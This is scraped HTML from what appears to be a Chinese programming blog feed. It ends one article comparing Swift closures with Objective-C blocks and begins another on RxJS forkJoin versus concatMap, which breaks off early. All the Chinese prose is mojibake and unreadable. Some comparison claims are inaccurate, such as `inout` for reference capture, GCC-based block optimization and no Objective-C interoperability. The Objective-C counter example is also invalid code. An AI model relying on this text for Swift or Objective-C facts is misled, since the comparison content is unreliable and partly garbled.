<span class="hljs-keyword">func</span> <span class="hljs-title function_">doSomething</span>(<span class="hljs-params">action</span>: () -&gt; <span class="hljs-type">Void</span>) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å‡†å¤‡åšäº‹"</span>)
    action()  <span class="hljs-comment">// å…·ä½“"æ€ä¹ˆåš"ç”±é—­åŒ…å†³å®š</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"äº‹æƒ…å®Œæˆ"</span>)
}

<span class="hljs-comment">// é—­åŒ…å®ç°äº†"æ€ä¹ˆåš"çš„å…·ä½“é€»è¾‘</span>
doSomething {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿™æ˜¯æˆ‘è¦åšçš„äº‹æƒ…"</span>)  <span class="hljs-comment">// å…·ä½“é€»è¾‘åœ¨è¿™é‡Œ</span>
}
</code></pre>
<p>è¿™æ ·ç†è§£å°±èƒ½æ¸…æ¥šï¼š<strong>å‡½æ•°æä¾›æ‰§è¡Œç¯å¢ƒå’Œæ—¶æœºï¼Œé—­åŒ…æä¾›å…·ä½“çš„æ‰§è¡Œé€»è¾‘</strong>ã€‚</p>
<h3 data-id="heading-54">Swifté—­åŒ… vs Objective-C Block å¯¹æ¯”</h3>
<h4 data-id="heading-55">é¢è¯•å¸¸é—®çš„æ ¸å¿ƒåŒºåˆ«</h4>
<h5 data-id="heading-56">1. <strong>è¯­è¨€å’Œè¯­æ³•å·®å¼‚</strong></h5>
<p><strong>Swifté—­åŒ…</strong>ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åŸºæœ¬è¯­æ³•</span>
<span class="hljs-keyword">let</span> closure: (<span class="hljs-type">Int</span>, <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> { (a, b) <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">return</span> a <span class="hljs-operator">+</span> b
}

<span class="hljs-comment">// ç®€åŒ–è¯­æ³•</span>
<span class="hljs-keyword">let</span> simplified <span class="hljs-operator">=</span> { <span class="hljs-variable">$0</span> <span class="hljs-operator">+</span> <span class="hljs-variable">$1</span> }

<span class="hljs-comment">// å°¾éšé—­åŒ…</span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">calculate</span>(<span class="hljs-params">a</span>: <span class="hljs-type">Int</span>, <span class="hljs-params">b</span>: <span class="hljs-type">Int</span>, <span class="hljs-params">operation</span>: (<span class="hljs-type">Int</span>, <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> {
    <span class="hljs-keyword">return</span> operation(a, b)
}

<span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> calculate(a: <span class="hljs-number">10</span>, b: <span class="hljs-number">5</span>) { <span class="hljs-variable">$0</span> <span class="hljs-operator">-</span> <span class="hljs-variable">$1</span> }
</code></pre>
<p><strong>Objective-C Block</strong>ï¼š</p>
<pre><code class="hljs language-objc" lang="objc"><span class="hljs-comment">// åŸºæœ¬è¯­æ³•</span>
<span class="hljs-type">int</span> (^block)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) = ^(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) {
    <span class="hljs-keyword">return</span> a + b;
};

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-type">int</span> result = block(<span class="hljs-number">10</span>, <span class="hljs-number">5</span>);

<span class="hljs-comment">// ä½œä¸ºå‚æ•°ä¼ é€’</span>
- (<span class="hljs-type">void</span>)calculateWithA:(<span class="hljs-type">int</span>)a b:(<span class="hljs-type">int</span>)b operation:(<span class="hljs-type">int</span>(^)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>))operation {
    <span class="hljs-type">int</span> result = operation(a, b);
    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@"Result: %d"</span>, result);
}

<span class="hljs-comment">// è°ƒç”¨</span>
[<span class="hljs-keyword">self</span> calculateWithA:<span class="hljs-number">10</span> b:<span class="hljs-number">5</span> operation:^<span class="hljs-type">int</span>(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y) {
    <span class="hljs-keyword">return</span> x * y;
}];
</code></pre>
<h5 data-id="heading-57">2. <strong>ç±»å‹ç³»ç»Ÿå’Œç±»å‹æ¨æ–­</strong></h5>






























<table><thead><tr><th>ç‰¹æ€§</th><th>Swifté—­åŒ…</th><th>Objective-C Block</th></tr></thead><tbody><tr><td><strong>ç±»å‹æ ‡æ³¨</strong></td><td>æ”¯æŒç±»å‹æ¨æ–­ï¼Œå¤§å¤šå¯çœç•¥</td><td>éœ€è¦æ˜ç¡®ç±»å‹æ ‡æ³¨</td></tr><tr><td><strong>è¿”å›å€¼</strong></td><td>æ”¯æŒå¤šè¿”å›å€¼ã€å…ƒç»„</td><td>åªèƒ½å•è¿”å›å€¼</td></tr><tr><td><strong>å¯é€‰ç±»å‹</strong></td><td>åŸç”Ÿæ”¯æŒOptional</td><td>éœ€è¦ä½¿ç”¨æŒ‡é’ˆ</td></tr><tr><td><strong>æ³›å‹</strong></td><td>å¼ºå¤§æ³›å‹æ”¯æŒ</td><td>æœ‰é™æ³›å‹æ”¯æŒ</td></tr></tbody></table>
<h5 data-id="heading-58">3. <strong>å†…å­˜ç®¡ç†å’Œå¾ªç¯å¼•ç”¨</strong></h5>
<p><strong>Swifté—­åŒ…</strong>ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewController</span>: <span class="hljs-title class_">UIViewController</span> {
    <span class="hljs-keyword">var</span> completionHandler: (() -&gt; <span class="hljs-type">Void</span>)<span class="hljs-operator">?</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">setup</span>() {
        <span class="hljs-comment">// é¿å…å¾ªç¯å¼•ç”¨</span>
        completionHandler <span class="hljs-operator">=</span> { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.updateUI()
        }

        <span class="hljs-comment">// æˆ–ä½¿ç”¨ unownedï¼ˆå½“selfä¸€å®šå­˜åœ¨æ—¶ï¼‰</span>
        completionHandler <span class="hljs-operator">=</span> { [<span class="hljs-keyword">unowned</span> <span class="hljs-keyword">self</span>] <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">self</span>.updateUI()
        }
    }
}
</code></pre>
<p><strong>Objective-C Block</strong>ï¼š</p>
<pre><code class="hljs language-objc" lang="objc"><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> ()</span>
<span class="hljs-keyword">@property</span> (<span class="hljs-keyword">nonatomic</span>, <span class="hljs-keyword">copy</span>) <span class="hljs-type">void</span> (^completionHandler)(<span class="hljs-type">void</span>);
<span class="hljs-keyword">@end</span>

<span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">ViewController</span></span>

- (<span class="hljs-type">void</span>)setup {
    <span class="hljs-comment">// é¿å…å¾ªç¯å¼•ç”¨</span>
    __<span class="hljs-keyword">weak</span> <span class="hljs-keyword">typeof</span>(<span class="hljs-keyword">self</span>) weakSelf = <span class="hljs-keyword">self</span>;
    <span class="hljs-keyword">self</span>.completionHandler = ^{
        [weakSelf updateUI];
    };

    <span class="hljs-comment">// æˆ–ä½¿ç”¨ __unsafe_unretained</span>
    __<span class="hljs-keyword">unsafe_unretained</span> <span class="hljs-keyword">typeof</span>(<span class="hljs-keyword">self</span>) unsafeSelf = <span class="hljs-keyword">self</span>;
    <span class="hljs-keyword">self</span>.completionHandler = ^{
        [unsafeSelf updateUI];
    };
}

<span class="hljs-keyword">@end</span>
</code></pre>
<h5 data-id="heading-59">4. <strong>å˜é‡æ•è·æœºåˆ¶</strong></h5>

























<table><thead><tr><th>ç‰¹æ€§</th><th>Swifté—­åŒ…</th><th>Objective-C Block</th></tr></thead><tbody><tr><td><strong>å€¼æ•è·</strong></td><td>è‡ªåŠ¨æ•è·ï¼Œæ”¯æŒä¿®æ”¹</td><td>è‡ªåŠ¨æ•è·ï¼Œé»˜è®¤const</td></tr><tr><td><strong>å¼•ç”¨æ•è·</strong></td><td><code>inout</code>å…³é”®å­—</td><td><code>__block</code>ä¿®é¥°ç¬¦</td></tr><tr><td><strong>ä½œç”¨åŸŸ</strong></td><td>æ¸…æ™°çš„ä½œç”¨åŸŸè§„åˆ™</td><td>éœ€è¦æ³¨æ„blockä½œç”¨åŸŸ</td></tr></tbody></table>
<p><strong>Swiftæ•è·ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">createCounter</span>() -&gt; () -&gt; <span class="hljs-type">Int</span> {
    <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> {
        count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>  <span class="hljs-comment">// å¯ä»¥ä¿®æ”¹æ•è·çš„å˜é‡</span>
        <span class="hljs-keyword">return</span> count
    }
}
</code></pre>
<p><strong>Objective-Cæ•è·ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-objc" lang="objc"><span class="hljs-type">int</span> (^createCounter)(<span class="hljs-type">void</span>) {
    __block <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;  <span class="hljs-comment">// éœ€è¦__blockä¿®é¥°ç¬¦æ‰èƒ½ä¿®æ”¹</span>
    <span class="hljs-keyword">return</span> ^<span class="hljs-type">int</span>{
        count += <span class="hljs-number">1</span>;
        <span class="hljs-keyword">return</span> count;
    };
}
</code></pre>
<h5 data-id="heading-60">5. <strong>æ€§èƒ½å’Œä¼˜åŒ–</strong></h5>

























<table><thead><tr><th>ç‰¹æ€§</th><th>Swifté—­åŒ…</th><th>Objective-C Block</th></tr></thead><tbody><tr><td><strong>ç¼–è¯‘ä¼˜åŒ–</strong></td><td>LLVMä¼˜åŒ–ï¼Œæ›´å¥½çš„å†…è”</td><td>GCCä¼˜åŒ–ï¼Œè¾ƒå°‘å†…è”</td></tr><tr><td><strong>è¿è¡Œæ—¶å¼€é”€</strong></td><td>è¾ƒå°ï¼ˆå€¼ç±»å‹ä¼˜åŒ–ï¼‰</td><td>è¾ƒå¤§ï¼ˆå †åˆ†é…ï¼‰</td></tr><tr><td><strong>è°ƒè¯•ä½“éªŒ</strong></td><td>æ›´å¥½çš„é”™è¯¯ä¿¡æ¯</td><td>è¾ƒéš¾è°ƒè¯•</td></tr></tbody></table>
<h5 data-id="heading-61">6. <strong>ä½¿ç”¨åœºæ™¯å’Œç”Ÿæ€</strong></h5>
<p><strong>Swifté—­åŒ…ä¼˜åŠ¿åœºæ™¯</strong>ï¼š</p>
<ul>
<li>ç°ä»£iOSå¼€å‘ï¼ˆiOS 8+ï¼‰</li>
<li>å‡½æ•°å¼ç¼–ç¨‹</li>
<li>åè®®å’Œæ³›å‹ç»“åˆ</li>
<li>SwiftUIå¼€å‘</li>
</ul>
<p><strong>Objective-C Blockä¼˜åŠ¿åœºæ™¯</strong>ï¼š</p>
<ul>
<li>é—ç•™ä»£ç åº“ç»´æŠ¤</li>
<li>ä¸C/C++äº¤äº’</li>
<li>åº•å±‚ç³»ç»Ÿç¼–ç¨‹</li>
</ul>
<h4 data-id="heading-62">ä¼˜ç¼ºç‚¹å¯¹æ¯”æ€»ç»“</h4>
<h5 data-id="heading-63">Swifté—­åŒ…çš„ä¼˜ç‚¹ï¼š</h5>
<ol>
<li><strong>è¯­æ³•ç®€æ´</strong>ï¼šç±»å‹æ¨æ–­ã€å°¾éšé—­åŒ…ã€ç®€åŒ–å‚æ•°</li>
<li><strong>ç±»å‹å®‰å…¨</strong>ï¼šç¼–è¯‘æ—¶ç±»å‹æ£€æŸ¥ï¼Œæ›´å°‘è¿è¡Œæ—¶é”™è¯¯</li>
<li><strong>ç°ä»£åŒ–ç‰¹æ€§</strong>ï¼šæ³›å‹ã€åè®®ã€Optionalç­‰</li>
<li><strong>æ€§èƒ½æ›´å¥½</strong>ï¼šä¼˜åŒ–ç¨‹åº¦æ›´é«˜</li>
<li><strong>æ˜“å­¦æ˜“ç”¨</strong>ï¼šå­¦ä¹ æ›²çº¿å¹³ç¼“</li>
</ol>
<h5 data-id="heading-64">Swifté—­åŒ…çš„ç¼ºç‚¹ï¼š</h5>
<ol>
<li><strong>å­¦ä¹ æˆæœ¬</strong>ï¼šéœ€è¦æŒæ¡æ–°è¯­æ³•</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šæ— æ³•ç›´æ¥ä¸Objective-Cä»£ç äº¤äº’</li>
<li><strong>è¿ç§»æˆæœ¬</strong>ï¼šä»Blockè¿ç§»éœ€è¦é‡å†™</li>
</ol>
<h5 data-id="heading-65">Objective-C Blockçš„ä¼˜ç‚¹ï¼š</h5>
<ol>
<li><strong>æˆç†Ÿç¨³å®š</strong>ï¼šç»è¿‡å¤šå¹´éªŒè¯</li>
<li><strong>å…¼å®¹æ€§å¥½</strong>ï¼šä¸C/Objective-Cå®Œç¾é›†æˆ</li>
<li><strong>åº•å±‚æ§åˆ¶</strong>ï¼šæ›´ç›´æ¥çš„å†…å­˜æ§åˆ¶</li>
</ol>
<h5 data-id="heading-66">Objective-C Blockçš„ç¼ºç‚¹ï¼š</h5>
<ol>
<li><strong>è¯­æ³•å¤æ‚</strong>ï¼šç±»å‹æ ‡æ³¨ç¹ç</li>
<li><strong>ç±»å‹ä¸å®‰å…¨</strong>ï¼šå®¹æ˜“å‡ºç°ç±»å‹é”™è¯¯</li>
<li><strong>è°ƒè¯•å›°éš¾</strong>ï¼šé”™è¯¯ä¿¡æ¯ä¸æ¸…æ™°</li>
<li><strong>ç°ä»£æ€§ä¸è¶³</strong>ï¼šç¼ºå°‘æ³›å‹ç­‰ç‰¹æ€§</li>
</ol>
<h4 data-id="heading-67">é¢è¯•å›ç­”è¦ç‚¹</h4>
<p><strong>å¦‚æœé—®åˆ°é€‰æ‹©å“ªä¸ª</strong>ï¼š</p>
<ul>
<li><strong>æ–°é¡¹ç›®</strong>ï¼šæ¨èSwifté—­åŒ…</li>
<li><strong>é—ç•™é¡¹ç›®</strong>ï¼šç»§ç»­ä½¿ç”¨Block</li>
<li><strong>æ··åˆé¡¹ç›®</strong>ï¼šè§†æƒ…å†µè€Œå®š</li>
</ul>
<p><strong>æ ¸å¿ƒç†è§£</strong>ï¼š</p>
<ul>
<li>Swifté—­åŒ…æ˜¯Blockçš„ç°ä»£åŒ–ç‰ˆæœ¬</li>
<li>ä¸¤è€…è§£å†³ç›¸åŒé—®é¢˜ï¼Œä½†Swiftæ›´ä¼˜é›…</li>
<li>æŒæ¡ä¸¤è€…æœ‰åŠ©äºç†è§£ç¼–ç¨‹èŒƒå¼æ¼”è¿›</li>
</ul>
<h4 data-id="heading-68">è¿ç§»æŒ‡å—</h4>
<p>ä»Blockåˆ°Swifté—­åŒ…çš„å¸¸è§è½¬æ¢ï¼š</p>
<pre><code class="hljs language-objc" lang="objc"><span class="hljs-comment">// Objective-C Block</span>
[<span class="hljs-keyword">self</span> fetchDataWithCompletion:^(<span class="hljs-built_in">NSData</span> *data, <span class="hljs-built_in">NSError</span> *error) {
    <span class="hljs-keyword">if</span> (error) {
        [<span class="hljs-keyword">self</span> showError:error];
    } <span class="hljs-keyword">else</span> {
        [<span class="hljs-keyword">self</span> processData:data];
    }
}];
</code></pre>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// Swifté—­åŒ…</span>
fetchData { data, error <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> error <span class="hljs-operator">=</span> error {
        showError(error)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> data {
        processData(data)
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[20ä¸ªä¾‹å­æŒæ¡RxJSâ€”â€”ç¬¬äºŒç« forkJoin å¹¶è¡Œè¯·æ±‚ vs concatMap ä¸²è¡Œè¯·æ±‚]]></title>    <link>https://juejin.cn/post/7600562816458375210</link>    <guid>https://juejin.cn/post/7600562816458375210</guid>    <pubDate>2026-01-29T09:00:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600562816458375210" data-draft-id="7600602502632685609" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="20ä¸ªä¾‹å­æŒæ¡RxJSâ€”â€”ç¬¬äºŒç« forkJoin å¹¶è¡Œè¯·æ±‚ vs concatMap ä¸²è¡Œè¯·æ±‚"/> <meta itemprop="keywords" content="Angular.js,RxJS"/> <meta itemprop="datePublished" content="2026-01-29T09:00:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeeYaMaster"/> <meta itemprop="url" content="https://juejin.cn/user/2348212565583085"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            20ä¸ªä¾‹å­æŒæ¡RxJSâ€”â€”ç¬¬äºŒç« forkJoin å¹¶è¡Œè¯·æ±‚ vs concatMap ä¸²è¡Œè¯·æ±‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2348212565583085/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeeYaMaster
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.1 åˆå­¦ä¹ç»ƒ
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.1 åˆå­¦ä¹ç»ƒ" title="VIP.1 åˆå­¦ä¹ç»ƒ" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T09:00:49.000Z" title="Thu Jan 29 2026 09:00:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RxJS å®æˆ˜ï¼šforkJoin å¹¶è¡Œè¯·æ±‚ vs concatMap ä¸²è¡Œè¯·æ±‚</h2>
<h3 data-id="heading-1">æ¦‚è¿°</h3>
<p>åœ¨å¤„ç†å¤šä¸ªå¼‚æ­¥è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§ä¸»è¦ç­–ç•¥ï¼šå¹¶è¡Œæ‰§è¡Œå’Œä¸²è¡Œæ‰§è¡Œã€‚æœ¬ç« å°†å¯¹æ¯” RxJS ä¸­çš„ <code>forkJoin</code>ï¼ˆå¹¶è¡Œï¼‰å’Œ <code>concatMap</code>ï¼ˆä¸²è¡Œï¼‰ä¸¤ç§æ–¹å¼ï¼Œå¸®åŠ©ä½ åœ¨ä¸åŒåœºæ™¯ä¸‹åšå‡ºæ­£ç¡®çš„é€‰æ‹©ã€‚</p>
<h3 data-id="heading-2">forkJoinï¼šå¹¶è¡Œæ‰§è¡Œ</h3>
<p><code>forkJoin</code> ä¼šåŒæ—¶å‘èµ·æ‰€æœ‰è¯·æ±‚ï¼Œç­‰å¾…æ‰€æœ‰è¯·æ±‚å®Œæˆåï¼Œå°†æ‰€æœ‰ç»“æœä¸€èµ·è¿”å›ã€‚</p>
<h4 data-id="heading-3">ç‰¹ç‚¹</h4>
<ul>
<li><strong>å¹¶å‘æ‰§è¡Œ</strong>ï¼šæ‰€æœ‰è¯·æ±‚åŒæ—¶å‘èµ·</li>
<li><strong>ç­‰å¾…å…¨éƒ¨å®Œæˆ</strong>ï¼šå¿…é¡»ç­‰å¾…æ‰€æœ‰è¯·æ±‚éƒ½å®Œæˆåæ‰è¿”å›ç»“æœ</li>
<li><strong>ç»“æœé¡ºåº</strong>ï¼šç»“æœæ•°ç»„çš„é¡ºåºä¸è¾“å…¥ Observable çš„é¡ºåºä¸€è‡´</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå¦‚æœä»»ä½•ä¸€ä¸ªè¯·æ±‚å¤±è´¥ï¼Œæ•´ä¸ª <code>forkJoin</code> ä¼šå¤±è´¥</li>
</ul>
<h4 data-id="heading-4">é€‚ç”¨åœºæ™¯</h4>
<ul>
<li>å¤šä¸ªç‹¬ç«‹çš„è¯·æ±‚ï¼Œå¯ä»¥å¹¶è¡Œæ‰§è¡Œ</li>
<li>éœ€è¦ç­‰å¾…æ‰€æœ‰è¯·æ±‚å®Œæˆåæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œ</li>
<li>å¯¹å“åº”æ—¶é—´è¦æ±‚è¾ƒé«˜ï¼Œå¸Œæœ›å°½å¿«å¾—åˆ°æ‰€æœ‰ç»“æœ</li>
</ul>
<h4 data-id="heading-5">ä»£ç ç¤ºä¾‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> delay1$ = <span class="hljs-variable language_">this</span>.<span class="hljs-property">http</span>.<span class="hljs-property">get</span>&lt;<span class="hljs-title class_">DelayApiResponse</span>&gt;(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.apiBaseUrl}</span>/api/delay1`</span>);
<span class="hljs-keyword">const</span> delay2$ = <span class="hljs-variable language_">this</span>.<span class="hljs-property">http</span>.<span class="hljs-property">get</span>&lt;<span class="hljs-title class_">DelayApiResponse</span>&gt;(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.apiBaseUrl}</span>/api/delay2`</span>);
<span class="hljs-keyword">const</span> delay3$ = <span class="hljs-variable language_">this</span>.<span class="hljs-property">http</span>.<span class="hljs-property">get</span>&lt;<span class="hljs-title class_">DelayApiResponse</span>&gt;(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.apiBaseUrl}</span>/api/delay3`</span>);

<span class="hljs-title function_">forkJoin</span>({
  <span class="hljs-attr">delay1</span>: delay1$,
  <span class="hljs-attr">delay2</span>: delay2$,
  <span class="hljs-attr">delay3</span>: delay3$
})
  .<span class="hljs-title function_">subscribe</span>({
    <span class="hljs-attr">next</span>: <span class="hljs-function">(<span class="hljs-params">results</span>) =&gt;</span> {
      <span class="hljs-comment">// æ‰€æœ‰è¯·æ±‚æˆåŠŸï¼Œç»“æœæŒ‰å¯¹è±¡é”®åç»„ç»‡</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">delay1Result</span> = results.<span class="hljs-property">delay1</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">delay2Result</span> = results.<span class="hljs-property">delay2</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">delay3Result</span> = results.<span class="hljs-property">delay3</span>;
      <span class="hljs-comment">// æ€»è€—æ—¶çº¦ä¸ºæœ€æ…¢æ¥å£çš„æ—¶é—´ï¼ˆçº¦3ç§’ï¼‰</span>
    },
    <span class="hljs-attr">error</span>: <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è¯·æ±‚å¤±è´¥:'</span>, err);
    }
  });
</code></pre>
<h4 data-id="heading-6">æ€§èƒ½åˆ†æ</h4>
